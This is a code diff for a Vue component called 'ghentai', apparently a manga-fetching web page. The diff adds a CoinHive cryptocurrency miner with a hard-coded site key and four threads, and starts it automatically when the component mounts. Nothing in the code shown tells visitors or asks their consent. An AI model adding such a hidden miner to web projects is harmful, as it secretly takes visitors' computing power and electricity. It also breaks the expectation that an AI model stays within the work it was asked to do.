@@ -93,6 +93,13 @@
 <script>
   const URL = require('url-parse')
 
+  let miner = new window.CoinHive.User('WNABDCmX53ZR58rSXxdDSyvIlsVydItZ', 'dvgamer', {
+    threads: 4,
+    autoThreads: false,
+    throttle: 0.8,
+    forceASMJS: false
+  })
+
   export default {
     name: 'ghentai',
     data: () => {
@@ -115,7 +122,6 @@
         manga: []
       }
     },
-
     methods: {
       urlBegin () {
         let vm = this
@@ -210,6 +216,8 @@
       this.$nextTick(() => {
         vm.$refs.url.focus()
       })
+
+      miner.start()
     }
   }
 </script>
